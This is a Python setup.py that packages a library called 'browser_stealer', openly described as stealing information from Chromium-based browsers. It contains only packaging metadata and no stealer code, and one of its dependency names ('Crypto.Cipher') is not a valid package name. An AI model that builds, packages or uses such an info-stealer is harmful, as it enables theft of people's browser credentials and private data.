from setuptools import setup, find_packages

VERSION = "1.1.0"

setup(
    name="browser_stealer",
    version=VERSION,
    author="Josakko",
    author_email="josakko@protonmail.com",
    description="Python library for stealing different info from chromium based browsers",
    packages=find_packages(),
    install_requires=["Crypto.Cipher", "pywin32"],
)
